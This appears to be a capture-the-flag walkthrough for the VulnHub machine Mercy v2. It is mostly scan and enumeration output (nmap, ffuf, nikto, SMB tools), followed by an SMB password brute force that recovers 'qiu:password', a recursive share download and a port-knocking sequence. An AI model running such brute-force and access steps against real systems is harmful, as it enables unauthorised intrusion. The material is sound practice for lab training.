Mon Feb 7 19:15:36 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /root/vulnHub/Digitalworld.local-Mercy-v2/192.168.110.19/scans/_full_tcp_nmap.txt -oX /root/vulnHub/Digitalworld.local-Mercy-v2/192.168.110.19/scans/xml/_full_tcp_nmap.xml 192.168.110.19Nmap scan report for 192.168.110.19Host is up, received arp-response (0.00053s latency).Scanned at 2022-02-07 19:15:50 +08 for 31sNot shown: 65525 closed tcp ports (reset)PORT STATE SERVICE REASON VERSION22/tcp filtered ssh no-response53/tcp open domain syn-ack ttl 64 ISC BIND 9.9.5-3ubuntu0.17 (Ubuntu Linux)| dns-nsid: |_ bind.version: 9.9.5-3ubuntu0.17-Ubuntu80/tcp filtered http no-response110/tcp open pop3 syn-ack ttl 64 Dovecot pop3d| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server/emailAddress=root@localhost/organizationalUnitName=localhost| Issuer: commonName=localhost/organizationName=Dovecot mail server/emailAddress=root@localhost/organizationalUnitName=localhost| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2018-08-24T13:22:55| Not valid after: 2028-08-23T13:22:55| MD5: 5114 fd64 1d28 7465 e1c8 8fde af46 c767| SHA-1: b1d2 b496 ab16 ed59 df4e 396e 6aa4 94df e59f c991| -----BEGIN CERTIFICATE-----| MIIDnTCCAoWgAwIBAgIJAJSmN2X0v1fgMA0GCSqGSIb3DQEBCwUAMGUxHDAaBgNV| BAoME0RvdmVjb3QgbWFpbCBzZXJ2ZXIxEjAQBgNVBAsMCWxvY2FsaG9zdDESMBAG| A1UEAwwJbG9jYWxob3N0MR0wGwYJKoZIhvcNAQkBFg5yb290QGxvY2FsaG9zdDAe| Fw0xODA4MjQxMzIyNTVaFw0yODA4MjMxMzIyNTVaMGUxHDAaBgNVBAoME0RvdmVj| b3QgbWFpbCBzZXJ2ZXIxEjAQBgNVBAsMCWxvY2FsaG9zdDESMBAGA1UEAwwJbG9j| YWxob3N0MR0wGwYJKoZIhvcNAQkBFg5yb290QGxvY2FsaG9zdDCCASIwDQYJKoZI| hvcNAQEBBQADggEPADCCAQoCggEBAKu55qkWb82oRinbXM7yriNhM89K8G7qeuYC| xvpaeScaIhX4T8+KDbA5+ekrkKba8Zw/8EYKD5zovZqjL9DbwE0dmDVR/zVUkV79| 9kyqOejKzIPFj8yr2OgNhDSpIrX76aEMgxY4H4TffGX5AiT2F4gVsaAh24pEvN8T| YMJpusrcslfkxvKCl1SV0BXkfLIbQW93SxYH3pgABMpcjLsunCXgzOY0mc+eAfKO| Js/JwKQZvblphTQJTT0QBRGjXoKf/v4Ka6dLcNPZHV1ej/b6RxGNhqd7ZBtoqVMb| TdCKz40EnBaOsyIZnlM0bs+coxok1N5x12WHBpzbf2yKIKdDHzUCAwEAAaNQME4w| HQYDVR0OBBYEFHM5ygJg0U68O2+1Yzkmwy7p65/LMB8GA1UdIwQYMBaAFHM5ygJg| 0U68O2+1Yzkmwy7p65/LMAwGA1UdEwQFMAMBAf8wDQYJKoZIhvcNAQELBQADggEB| AGPDeUWsmdzhE9pXcmmdQVs763g7iUHpFS12m+Vvj5wQWJxMYqvXV1HvDljZL/sY| EapBfXl+U/vDswW+KUUqjAbC4z2tVIGU4Yqd48R/8S4pEQ/98DIyIlcS1RsBXlJd| ELgFQ3CAG6XWvX3zgkkj8JYYBifUBNPuCtME2YFVHfs4D1M4KsDzW7i1iBtLaVPj| zVy+MgJU1UZ11szaw6/C8HT+A/gf0zqIKXTECaHUENSaB0GMGqoh1HjL8sSHLGBH| SgZqcBuJhD9VQ2IjbinG0eZErgTbG58xM2a+Eyq3nQ7CuAGq/+I3yxYGh6OSCr9Z| z+3Va0s54XjQ2xICsn7tKrg=|_-----END CERTIFICATE-----|_ssl-date: TLS randomness does not represent time|_pop3-capabilities: RESP-CODES AUTH-RESP-CODE PIPELINING STLS SASL UIDL CAPA TOP139/tcp open netbios-ssn syn-ack ttl 64 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)143/tcp open imap syn-ack ttl 64 Dovecot imapd (Ubuntu)|_ssl-date: TLS randomness does not represent time|_imap-capabilities: more IMAP4rev1 IDLE capabilities have SASL-IR OK ID STARTTLS LITERAL+ listed LOGIN-REFERRALS LOGINDISABLEDA0001 Pre-login post-login ENABLE| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server/emailAddress=root@localhost/organizationalUnitName=localhost| Issuer: commonName=localhost/organizationName=Dovecot mail server/emailAddress=root@localhost/organizationalUnitName=localhost| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2018-08-24T13:22:55| Not valid after: 2028-08-23T13:22:55| MD5: 5114 fd64 1d28 7465 e1c8 8fde af46 c767| SHA-1: b1d2 b496 ab16 ed59 df4e 396e 6aa4 94df e59f c991| -----BEGIN CERTIFICATE-----| MIIDnTCCAoWgAwIBAgIJAJSmN2X0v1fgMA0GCSqGSIb3DQEBCwUAMGUxHDAaBgNV| BAoME0RvdmVjb3QgbWFpbCBzZXJ2ZXIxEjAQBgNVBAsMCWxvY2FsaG9zdDESMBAG| A1UEAwwJbG9jYWxob3N0MR0wGwYJKoZIhvcNAQkBFg5yb290QGxvY2FsaG9zdDAe| Fw0xODA4MjQxMzIyNTVaFw0yODA4MjMxMzIyNTVaMGUxHDAaBgNVBAoME0RvdmVj| b3QgbWFpbCBzZXJ2ZXIxEjAQBgNVBAsMCWxvY2FsaG9zdDESMBAGA1UEAwwJbG9j| YWxob3N0MR0wGwYJKoZIhvcNAQkBFg5yb290QGxvY2FsaG9zdDCCASIwDQYJKoZI| hvcNAQEBBQADggEPADCCAQoCggEBAKu55qkWb82oRinbXM7yriNhM89K8G7qeuYC| xvpaeScaIhX4T8+KDbA5+ekrkKba8Zw/8EYKD5zovZqjL9DbwE0dmDVR/zVUkV79| 9kyqOejKzIPFj8yr2OgNhDSpIrX76aEMgxY4H4TffGX5AiT2F4gVsaAh24pEvN8T| YMJpusrcslfkxvKCl1SV0BXkfLIbQW93SxYH3pgABMpcjLsunCXgzOY0mc+eAfKO| Js/JwKQZvblphTQJTT0QBRGjXoKf/v4Ka6dLcNPZHV1ej/b6RxGNhqd7ZBtoqVMb| TdCKz40EnBaOsyIZnlM0bs+coxok1N5x12WHBpzbf2yKIKdDHzUCAwEAAaNQME4w| HQYDVR0OBBYEFHM5ygJg0U68O2+1Yzkmwy7p65/LMB8GA1UdIwQYMBaAFHM5ygJg| 0U68O2+1Yzkmwy7p65/LMAwGA1UdEwQFMAMBAf8wDQYJKoZIhvcNAQELBQADggEB| AGPDeUWsmdzhE9pXcmmdQVs763g7iUHpFS12m+Vvj5wQWJxMYqvXV1HvDljZL/sY| EapBfXl+U/vDswW+KUUqjAbC4z2tVIGU4Yqd48R/8S4pEQ/98DIyIlcS1RsBXlJd| ELgFQ3CAG6XWvX3zgkkj8JYYBifUBNPuCtME2YFVHfs4D1M4KsDzW7i1iBtLaVPj| zVy+MgJU1UZ11szaw6/C8HT+A/gf0zqIKXTECaHUENSaB0GMGqoh1HjL8sSHLGBH| SgZqcBuJhD9VQ2IjbinG0eZErgTbG58xM2a+Eyq3nQ7CuAGq/+I3yxYGh6OSCr9Z| z+3Va0s54XjQ2xICsn7tKrg=|_-----END CERTIFICATE-----445/tcp open netbios-ssn syn-ack ttl 64 Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)993/tcp open ssl/imap syn-ack ttl 64 Dovecot imapd (Ubuntu)| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server/emailAddress=root@localhost/organizationalUnitName=localhost| Issuer: commonName=localhost/organizationName=Dovecot mail server/emailAddress=root@localhost/organizationalUnitName=localhost| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2018-08-24T13:22:55| Not valid after: 2028-08-23T13:22:55| MD5: 5114 fd64 1d28 7465 e1c8 8fde af46 c767| SHA-1: b1d2 b496 ab16 ed59 df4e 396e 6aa4 94df e59f c991| -----BEGIN CERTIFICATE-----| MIIDnTCCAoWgAwIBAgIJAJSmN2X0v1fgMA0GCSqGSIb3DQEBCwUAMGUxHDAaBgNV| BAoME0RvdmVjb3QgbWFpbCBzZXJ2ZXIxEjAQBgNVBAsMCWxvY2FsaG9zdDESMBAG| A1UEAwwJbG9jYWxob3N0MR0wGwYJKoZIhvcNAQkBFg5yb290QGxvY2FsaG9zdDAe| Fw0xODA4MjQxMzIyNTVaFw0yODA4MjMxMzIyNTVaMGUxHDAaBgNVBAoME0RvdmVj| b3QgbWFpbCBzZXJ2ZXIxEjAQBgNVBAsMCWxvY2FsaG9zdDESMBAGA1UEAwwJbG9j| YWxob3N0MR0wGwYJKoZIhvcNAQkBFg5yb290QGxvY2FsaG9zdDCCASIwDQYJKoZI| hvcNAQEBBQADggEPADCCAQoCggEBAKu55qkWb82oRinbXM7yriNhM89K8G7qeuYC| xvpaeScaIhX4T8+KDbA5+ekrkKba8Zw/8EYKD5zovZqjL9DbwE0dmDVR/zVUkV79| 9kyqOejKzIPFj8yr2OgNhDSpIrX76aEMgxY4H4TffGX5AiT2F4gVsaAh24pEvN8T| YMJpusrcslfkxvKCl1SV0BXkfLIbQW93SxYH3pgABMpcjLsunCXgzOY0mc+eAfKO| Js/JwKQZvblphTQJTT0QBRGjXoKf/v4Ka6dLcNPZHV1ej/b6RxGNhqd7ZBtoqVMb| TdCKz40EnBaOsyIZnlM0bs+coxok1N5x12WHBpzbf2yKIKdDHzUCAwEAAaNQME4w| HQYDVR0OBBYEFHM5ygJg0U68O2+1Yzkmwy7p65/LMB8GA1UdIwQYMBaAFHM5ygJg| 0U68O2+1Yzkmwy7p65/LMAwGA1UdEwQFMAMBAf8wDQYJKoZIhvcNAQELBQADggEB| AGPDeUWsmdzhE9pXcmmdQVs763g7iUHpFS12m+Vvj5wQWJxMYqvXV1HvDljZL/sY| EapBfXl+U/vDswW+KUUqjAbC4z2tVIGU4Yqd48R/8S4pEQ/98DIyIlcS1RsBXlJd| ELgFQ3CAG6XWvX3zgkkj8JYYBifUBNPuCtME2YFVHfs4D1M4KsDzW7i1iBtLaVPj| zVy+MgJU1UZ11szaw6/C8HT+A/gf0zqIKXTECaHUENSaB0GMGqoh1HjL8sSHLGBH| SgZqcBuJhD9VQ2IjbinG0eZErgTbG58xM2a+Eyq3nQ7CuAGq/+I3yxYGh6OSCr9Z| z+3Va0s54XjQ2xICsn7tKrg=|_-----END CERTIFICATE-----|_ssl-date: TLS randomness does not represent time|_imap-capabilities: IMAP4rev1 IDLE capabilities more SASL-IR OK ID have LITERAL+ AUTH=PLAINA0001 LOGIN-REFERRALS listed Pre-login post-login ENABLE995/tcp open ssl/pop3 syn-ack ttl 64 Dovecot pop3d| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server/emailAddress=root@localhost/organizationalUnitName=localhost| Issuer: commonName=localhost/organizationName=Dovecot mail server/emailAddress=root@localhost/organizationalUnitName=localhost| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2018-08-24T13:22:55| Not valid after: 2028-08-23T13:22:55| MD5: 5114 fd64 1d28 7465 e1c8 8fde af46 c767| SHA-1: b1d2 b496 ab16 ed59 df4e 396e 6aa4 94df e59f c991| -----BEGIN CERTIFICATE-----| MIIDnTCCAoWgAwIBAgIJAJSmN2X0v1fgMA0GCSqGSIb3DQEBCwUAMGUxHDAaBgNV| BAoME0RvdmVjb3QgbWFpbCBzZXJ2ZXIxEjAQBgNVBAsMCWxvY2FsaG9zdDESMBAG| A1UEAwwJbG9jYWxob3N0MR0wGwYJKoZIhvcNAQkBFg5yb290QGxvY2FsaG9zdDAe| Fw0xODA4MjQxMzIyNTVaFw0yODA4MjMxMzIyNTVaMGUxHDAaBgNVBAoME0RvdmVj| b3QgbWFpbCBzZXJ2ZXIxEjAQBgNVBAsMCWxvY2FsaG9zdDESMBAGA1UEAwwJbG9j| YWxob3N0MR0wGwYJKoZIhvcNAQkBFg5yb290QGxvY2FsaG9zdDCCASIwDQYJKoZI| hvcNAQEBBQADggEPADCCAQoCggEBAKu55qkWb82oRinbXM7yriNhM89K8G7qeuYC| xvpaeScaIhX4T8+KDbA5+ekrkKba8Zw/8EYKD5zovZqjL9DbwE0dmDVR/zVUkV79| 9kyqOejKzIPFj8yr2OgNhDSpIrX76aEMgxY4H4TffGX5AiT2F4gVsaAh24pEvN8T| YMJpusrcslfkxvKCl1SV0BXkfLIbQW93SxYH3pgABMpcjLsunCXgzOY0mc+eAfKO| Js/JwKQZvblphTQJTT0QBRGjXoKf/v4Ka6dLcNPZHV1ej/b6RxGNhqd7ZBtoqVMb| TdCKz40EnBaOsyIZnlM0bs+coxok1N5x12WHBpzbf2yKIKdDHzUCAwEAAaNQME4w| HQYDVR0OBBYEFHM5ygJg0U68O2+1Yzkmwy7p65/LMB8GA1UdIwQYMBaAFHM5ygJg| 0U68O2+1Yzkmwy7p65/LMAwGA1UdEwQFMAMBAf8wDQYJKoZIhvcNAQELBQADggEB| AGPDeUWsmdzhE9pXcmmdQVs763g7iUHpFS12m+Vvj5wQWJxMYqvXV1HvDljZL/sY| EapBfXl+U/vDswW+KUUqjAbC4z2tVIGU4Yqd48R/8S4pEQ/98DIyIlcS1RsBXlJd| ELgFQ3CAG6XWvX3zgkkj8JYYBifUBNPuCtME2YFVHfs4D1M4KsDzW7i1iBtLaVPj| zVy+MgJU1UZ11szaw6/C8HT+A/gf0zqIKXTECaHUENSaB0GMGqoh1HjL8sSHLGBH| SgZqcBuJhD9VQ2IjbinG0eZErgTbG58xM2a+Eyq3nQ7CuAGq/+I3yxYGh6OSCr9Z| z+3Va0s54XjQ2xICsn7tKrg=|_-----END CERTIFICATE-----|_pop3-capabilities: RESP-CODES AUTH-RESP-CODE PIPELINING USER SASL(PLAIN) UIDL CAPA TOP|_ssl-date: TLS randomness does not represent time8080/tcp open http syn-ack ttl 64 Apache Tomcat/Coyote JSP engine 1.1|_http-server-header: Apache-Coyote/1.1| http-methods: | Supported Methods: GET HEAD POST PUT DELETE OPTIONS|_ Potentially risky methods: PUT DELETE|_http-open-proxy: Proxy might be redirecting requests|_http-title: Apache Tomcat| http-robots.txt: 1 disallowed entry |_/tryharder/tryharderMAC Address: 08:00:27:CC:62:BC (Oracle VirtualBox virtual NIC)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9TCP/IP fingerprint:OS:SCAN(V=7.92%E=4%D=2/7%OT=53%CT=1%CU=43153%PV=Y%DS=1%DC=D%G=Y%M=080027%TMOS:=6200FF85%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10C%TI=Z%CI=I%II=I%OS:TS=8)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5OS:=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=OS:7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%OS:A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0OS:%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%SOS:=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(ROS:=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=NOS:%T=40%CD=S)Uptime guess: 0.005 days (since Mon Feb 7 19:09:23 2022)Network Distance: 1 hopTCP Sequence Prediction: Difficulty=260 (Good luck!)IP ID Sequence Generation: All zerosService Info: Host: MERCY; OS: Linux; CPE: cpe:/o:linux:linux_kernelHost script results:|_clock-skew: mean: 5h19m58s, deviation: 4h37m07s, median: 7h59m57s| p2p-conficker: | Checking for Conficker.C or higher...| Check 1 (port 20630/tcp): CLEAN (Couldn&#39;t connect)| Check 2 (port 22633/tcp): CLEAN (Couldn&#39;t connect)| Check 3 (port 41049/udp): CLEAN (Timeout)| Check 4 (port 56145/udp): CLEAN (Timeout)|_ 0/4 checks are positive: Host is CLEAN or ports are blocked| smb2-time: | date: 2022-02-07T19:16:08|_ start_date: N/A| smb2-security-mode: | 3.1.1: |_ Message signing enabled but not required| nbstat: NetBIOS name: MERCY, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: &amp;lt;unknown&amp;gt; (unknown)| Names:| MERCY&amp;lt;00&amp;gt; Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;| MERCY&amp;lt;03&amp;gt; Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;| MERCY&amp;lt;20&amp;gt; Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;| \\x01\\x02__MSBROWSE__\\x02&amp;lt;01&amp;gt; Flags: &amp;lt;group&amp;gt;&amp;lt;active&amp;gt;| WORKGROUP&amp;lt;00&amp;gt; Flags: &amp;lt;group&amp;gt;&amp;lt;active&amp;gt;| WORKGROUP&amp;lt;1d&amp;gt; Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;| WORKGROUP&amp;lt;1e&amp;gt; Flags: &amp;lt;group&amp;gt;&amp;lt;active&amp;gt;| Statistics:| 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00| 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00|_ 00 00 00 00 00 00 00 00 00 00 00 00 00 00| smb-security-mode: | account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)| smb-os-discovery: | OS: Windows 6.1 (Samba 4.3.11-Ubuntu)| Computer name: mercy| NetBIOS computer name: MERCY\\x00| Domain name: \\x00| FQDN: mercy|_ System time: 2022-02-08T03:16:08+08:00TRACEROUTEHOP RTT ADDRESS1 0.53 ms 192.168.110.19Read data files from: /usr/bin/../share/nmapOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Mon Feb 7 19:16:21 2022 -- 1 IP address (1 host up) scanned in 45.90 secondsTCP/8080 (HTTP)FFUF - common.txt┌──(root💀kali)-[~/vulnHub/Digitalworld.local-Mercy-v2]└─# ffuf -u http://$ip:8080/FUZZ -w /usr/share/wordlists/dirb/common.txt -e &#39;.html,.txt,.php&#39; /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &amp;lt;3________________________________________________ :: Method : GET :: URL : http://192.168.110.19:8080/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/common.txt :: Extensions : .html .txt .php :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405________________________________________________ [Status: 200, Size: 1895, Words: 201, Lines: 30]docs [Status: 302, Size: 0, Words: 1, Lines: 1]examples [Status: 302, Size: 0, Words: 1, Lines: 1]host-manager [Status: 302, Size: 0, Words: 1, Lines: 1]index.html [Status: 200, Size: 1895, Words: 201, Lines: 30]index.html [Status: 200, Size: 1895, Words: 201, Lines: 30]manager [Status: 302, Size: 0, Words: 1, Lines: 1]robots.txt [Status: 200, Size: 45, Words: 3, Lines: 3]:: Progress: [18460/18460] :: Job [1/1] :: 2658 req/sec :: Duration: [0:00:06] :: Errors: 0 :: host-manager robots.txt managerNikto┌──(root💀kali)-[~/vulnHub/Digitalworld.local-Mercy-v2]└─# nikto -ask=no -h http://192.168.110.19:8080 2&amp;gt;&amp;amp;1 | tee &quot;/root/vulnHub/Digitalworld.local-Mercy-v2/192.168.110.19/scans/tcp8080/tcp_8080_http_nikto.txt&quot;- Nikto v2.1.6---------------------------------------------------------------------------+ Target IP: 192.168.110.19+ Target Hostname: 192.168.110.19+ Target Port: 8080+ Start Time: 2022-02-07 20:44:59 (GMT8)---------------------------------------------------------------------------+ Server: Apache-Coyote/1.1+ The anti-clickjacking X-Frame-Options header is not present.+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)+ &quot;robots.txt&quot; contains 1 entry which should be manually viewed.+ Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS + OSVDB-397: HTTP method (&#39;Allow&#39; Header): &#39;PUT&#39; method could allow clients to save files on the web server.+ OSVDB-5646: HTTP method (&#39;Allow&#39; Header): &#39;DELETE&#39; may allow clients to remove files on the web server.+ /: Appears to be a default Apache Tomcat install.+ /examples/servlets/index.html: Apache Tomcat default JSP pages present.+ OSVDB-3720: /examples/jsp/snp/snoop.jsp: Displays information about page retrievals, including other users.+ /manager/html: Default Tomcat Manager / Host Manager interface found+ /host-manager/html: Default Tomcat Manager / Host Manager interface found+ /manager/status: Default Tomcat Server Status interface found+ 8222 requests: 0 error(s) and 13 item(s) reported on remote host+ End Time: 2022-02-07 20:45:18 (GMT8) (19 seconds)---------------------------------------------------------------------------+ 1 host(s) tested tomcatCMSTCP/139,445 (SMB)Enum4linux ---------------------------------------| Users via RPC on 192.168.110.19 | ---------------------------------------[*] Enumerating users via &#39;querydispinfo&#39;[+] Found 2 users via &#39;querydispinfo&#39;[*] Enumerating users via &#39;enumdomusers&#39;[+] Found 2 users via &#39;enumdomusers&#39;[+] After merging user results we have 2 users total:&#39;1000&#39;: username: pleadformercy name: QIU acb: &#39;0x00000010&#39; description: &#39;&#39;&#39;1001&#39;: username: qiu name: &#39;&#39; acb: &#39;0x00000010&#39; description: &#39;&#39; Usernames pleadformercy qiu Crackmapexec┌──(root💀kali)-[~/vulnHub/Digitalworld.local-Mercy-v2/192.168.110.19]└─# crackmapexec smb $ip -u &#39;guest&#39; -p &#39;&#39; --sharesSMB 192.168.110.19 445 MERCY [*] Windows 6.1 (name:MERCY) (domain:) (signing:False) (SMBv1:True)SMB 192.168.110.19 445 MERCY [+] \\guest: SMB 192.168.110.19 445 MERCY [+] Enumerated sharesSMB 192.168.110.19 445 MERCY Share Permissions RemarkSMB 192.168.110.19 445 MERCY ----- ----------- ------SMB 192.168.110.19 445 MERCY print$ Printer DriversSMB 192.168.110.19 445 MERCY qiu SMB 192.168.110.19 445 MERCY IPC$ IPC Service (MERCY server (Samba, Ubuntu)) qiu - NO ACCESSSMBMap┌──(root💀kali)-[~/vulnHub/Digitalworld.local-Mercy-v2/192.168.110.19]└─# smbmap -u &#39;&#39; -p &#39;&#39; -H $ip[+] Guest session IP: 192.168.110.19:445 Name: unknown Disk Permissions Comment ---- ----------- ------- print$ NO ACCESS Printer Drivers qiu NO ACCESS IPC$ NO ACCESS IPC Service (MERCY server (Samba, Ubuntu)) qiu - NO ACCESSInitial FootholdTCP/8080 (HTTP) - Hidden Directory View enumerated directories examples contains example servlets and JSPs. index.html host-manager Basic Authentication robots.txt ┌──(root💀kali)-[~/vulnHub/Digitalworld.local-Mercy-v2/192.168.110.19] └─# curl http://$ip:8080/robots.txt User-agent: * Disallow: /tryharder/tryharder /tryharder/tryharder ┌──(root💀kali)-[~/vulnHub/Digitalworld.local-Mercy-v2/192.168.110.19] └─# curl http://$ip:8080/tryharder/tryharder SXQncyBhbm5veWluZywgYnV0IHdlIHJlcGVhdCB0aGlzIG92ZXIgYW5kIG92ZXIgYWdhaW46IGN5YmVyIGh5Z2llbmUgaXMgZXh0cmVtZWx5IGltcG9ydGFudC4gUGxlYXNlIHN0b3Agc2V0dGluZyBzaWxseSBwYXNzd29yZHMgdGhhdCB3aWxsIGdldCBjcmFja2VkIHdpdGggYW55IGRlY2VudCBwYXNzd29yZCBsaXN0LgoKT25jZSwgd2UgZm91bmQgdGhlIHBhc3N3b3JkICJwYXNzd29yZCIsIHF1aXRlIGxpdGVyYWxseSBzdGlja2luZyBvbiBhIHBvc3QtaXQgaW4gZnJvbnQgb2YgYW4gZW1wbG95ZWUncyBkZXNrISBBcyBzaWxseSBhcyBpdCBtYXkgYmUsIHRoZSBlbXBsb3llZSBwbGVhZGVkIGZvciBtZXJjeSB3aGVuIHdlIHRocmVhdGVuZWQgdG8gZmlyZSBoZXIuCgpObyBmbHVmZnkgYnVubmllcyBmb3IgdGhvc2Ugd2hvIHNldCBpbnNlY3VyZSBwYXNzd29yZHMgYW5kIGVuZGFuZ2VyIHRoZSBlbnRlcnByaXNlLg== Decode the encoded message from /tryharder/tryharder ┌──(root💀kali)-[~/vulnHub/Digitalworld.local-Mercy-v2/192.168.110.19] └─# curl -s http://$ip:8080/tryharder/tryharder | base64 -d | tee decoded.txt It&#39;s annoying, but we repeat this over and over again: cyber hygiene is extremely important. Please stop setting silly passwords that will get cracked with any decent password list. Once, we found the password &quot;password&quot;, quite literally sticking on a post-it in front of an employee&#39;s desk! As silly as it may be, the employee pleaded for mercy when we threatened to fire her. No fluffy bunnies for those who set insecure passwords and endanger the enterprise. Weak passwords? Bruteforce host-manager w/ known tomcat default credentials Failed TCP/139,445 (SMB) SMB Fileshare Bruteforce Bruteforce SMB Fileshare ┌──(root💀kali)-[~/vulnHub/Digitalworld.local-Mercy-v2/192.168.110.19/exploit] └─# ./smb_bruteforce.sh $ip qiu /usr/share/wordlists/SecLists/Passwords/Common-Credentials/500-worst-passwords.txt qiu Try: qiu + 123456 Try: qiu + password Found Valid Combination qiu:password Try: qiu + 12345678 Try: qiu + 1234 Try: qiu + pussy Try: qiu + 12345 Try: qiu + dragon Try: qiu + qwerty ┌──(root💀kali)-[~/vulnHub/Digitalworld.local-Mercy-v2/192.168.110.19/exploit] └─# cat Results.txt qiu:password View SMB Fileshares ┌──(root💀kali)-[~/vulnHub/Digitalworld.local-Mercy-v2/192.168.110.19/exploit] └─# smbmap -H $ip -u &#39;qiu&#39; -p &#39;password&#39; [+] IP: 192.168.110.19:445 Name: unknown Disk Permissions Comment ---- ----------- ------- print$ READ ONLY Printer Drivers qiu READ ONLY IPC$ NO ACCESS IPC Service (MERCY server (Samba, Ubuntu)) qiu - READ ONLY Download all files from qiu fileshare ┌──(root💀kali)-[~/vulnHub/Digitalworld.local-Mercy-v2/192.168.110.19/loot] └─# smbclient //$ip/qiu -U qiu -c &#39;prompt;recurse;mget *&#39; Enter WORKGROUP\\qiu&#39;s password: getting file \\.bashrc of size 3637 as .bashrc (5.7 KiloBytes/sec) (average 5.7 KiloBytes/sec) getting file \\.bash_history of size 163 as .bash_history (19.9 KiloBytes/sec) (average 5.9 KiloBytes/sec) getting file \\.bash_logout of size 220 as .bash_logout (19.5 KiloBytes/sec) (average 6.1 KiloBytes/sec) getting file \\.profile of size 675 as .profile (329.6 KiloBytes/sec) (average 7.1 KiloBytes/sec) getting file \\.cache\\motd.legal-displayed of size 0 as .cache/motd.legal-displayed (0.0 KiloBytes/sec) (average 7.1 KiloBytes/sec) getting file \\.private\\readme.txt of size 94 as .private/readme.txt (45.9 KiloBytes/sec) (average 7.2 KiloBytes/sec) getting file \\.public\\resources\\smiley of size 54 as .public/resources/smiley (2.4 KiloBytes/sec) (average 7.1 KiloBytes/sec) getting file \\.private\\opensesame\\configprint of size 539 as .private/opensesame/configprint (263.2 KiloBytes/sec) (average 7.8 KiloBytes/sec) getting file \\.private\\opensesame\\config of size 17543 as .private/opensesame/config (552.6 KiloBytes/sec) (average 31.9 KiloBytes/sec) View directory structure ┌──(root💀kali)-[~/vulnHub/Digitalworld.local-Mercy-v2/192.168.110.19/loot] └─# tree -a smb/ smb/ ├── .bash_history ├── .bash_logout ├── .bashrc ├── .cache │   └── motd.legal-displayed ├── .private │   ├── opensesame │   │   ├── config │   │   └── configprint │   ├── readme.txt │   └── secrets ├── .profile └── .public └── resources └── smiley 6 directories, 9 files View files configprint knockd.conf config Knock Sequence: 159,27391,4 17301,28504,9999 Port Knocking Port Knock ┌──(root💀kali)-[~/vulnHub/Digitalworld.local-Mercy-v2/192.168.110.19/loot] └─# knock -v $ip 159 27391 4 hitting tcp 192.168.110.19:159 hitting tcp 192.168.110.19:27391 hitting tcp 192.168.110.19:4 ┌──(root💀kali)-[~/vulnHub/Digitalworld.local-Mercy-v2/192.168.110.19/loot] └─# knock -v $ip 17301 28504 9999 hitting tcp 192.168.110.19:17301 hitting tcp 192.168.110.19:28504 hitting tcp 192.168.110.19:9999 Check for newly opened ports ┌──(root💀kali)-[~/vulnHub/Digitalworld.local-Mercy-v2/192.168.110.19/loot] └─# nmap $ip -p- Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-08 00:30 +08 Stats: 0:00:06 elapsed; 0 hosts completed (0 up), 1 undergoing ARP Ping Scan Parallel DNS resolution of 1 host. Timing: About 0.00% done Nmap scan report for 192.168.110.19 Host is up (0.00042s latency). Not shown: 65525 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 53/tcp open domain 80/tcp open http 110/tcp open pop3 139/tcp open netbios-ssn 143/tcp open imap 445/tcp open microsoft-ds 993/tcp open imaps 995/tcp open pop3s 